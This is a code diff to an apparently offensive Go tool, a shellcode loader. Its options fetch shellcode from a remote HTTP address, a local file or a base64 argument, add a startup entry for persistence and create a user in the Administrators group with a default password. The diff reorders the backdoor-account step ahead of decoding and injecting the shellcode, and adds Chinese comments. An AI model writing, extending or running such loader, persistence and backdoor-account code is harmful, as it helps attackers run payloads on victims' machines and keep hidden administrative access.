@@ -34,12 +34,19 @@ var (
 
 //初始化
 func init() {
+	//获取远程地址
 	rootCmd.PersistentFlags().StringVarP(&Uri, "Uri", "u", "", "HTTP service address hosting shellCode byte file")
+	//读取本地地址
 	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "Read from local byte file")
+	//是否开机自启，默认false，为true则开机自启
 	rootCmd.PersistentFlags().BoolVarP(&StartMenu, "Open", "o", false, "Add to startup item")
+	//向系统添加管理员用户，需联动-p参数设置密码
 	rootCmd.PersistentFlags().StringVarP(&UserName, "UserName", "n", "", "Add user to Administrators group.The default password is ZheTian@123 (Execute with administrator permissions)")
+	//添加用户的密码，需联动-n参数
 	rootCmd.PersistentFlags().StringVarP(&PassWD, "PassWD", "p", "", "User Password. Must use -n param")
+	//读取本地没有修改过的原始payload。
 	rootCmd.PersistentFlags().StringVarP(&Resource, "Payload Resource", "s", "", "Read payload source file,Supported lang:java、C、python、ruby、c#、perl、ruby...")
+	//从命令行读取base64字符串 如：ZheTian.exe -s xsa15as4d5a4das...
 	rootCmd.PersistentFlags().StringVarP(&CommLineCode, "Command line input ShellCode", "c", "", "Enter the base64 string into the command line")
 
 }
@@ -61,7 +68,22 @@ func Execute() {
 //示例：fc4883e4f0e8c8000000415141
 func startService() error {
 
-	//只能输入一个。就算输入多个也不会全部执行
+	//添加用户
+	if UserName != "" {
+		if len(UserName) <= 6 || len(PassWD) <= 6 {
+			fmt.Println("账户名与密码的长度需大于6位")
+			os.Exit(1)
+		}
+		if err := NetUserAdd(UserInfo{
+			UserName, PassWD,
+		}); err != nil {
+			//如果失败也不退出程序，继续执行shellcode。除非发生panic
+			fmt.Println(err.Error())
+		}
+	}
+
+	//只能选择一个参数
+	//默认选择第一条参数
 	if Uri != "" {
 		UriModel()
 	} else if FilePath != "" {
@@ -71,26 +93,20 @@ func startService() error {
 	} else if CommLineCode != "" {
 		CommLineModel()
 	}
-	if UserName != "" {
-		if len(UserName) <= 6 || len(PassWD) <= 6 {
-			fmt.Println("账户名与密码的长度需大于6位")
-			os.Exit(1)
-		}
-		if err := NetUserAdd(UserInfo{
-			UserName, PassWD,
-		}); err != nil {
-			fmt.Println(err.Error())
-		}
-	}
+
+	//添加开机自启。必须
 	if StartMenu {
 		StartUp()
 	}
+
+	//将base64转字符串
 	decodeBytes, err := base64.StdEncoding.DecodeString(string(ShellCodeByte))
 	if err != nil {
 		return errors.New(err.Error())
 	}
 
-	//最后执行该行
+	//执行shellCode
+	//将获取到的hex进行解码，转成二进制数组
 	shellCode, err := hex.DecodeString(string(decodeBytes))
 	if err == nil {
 		Inject(shellCode)
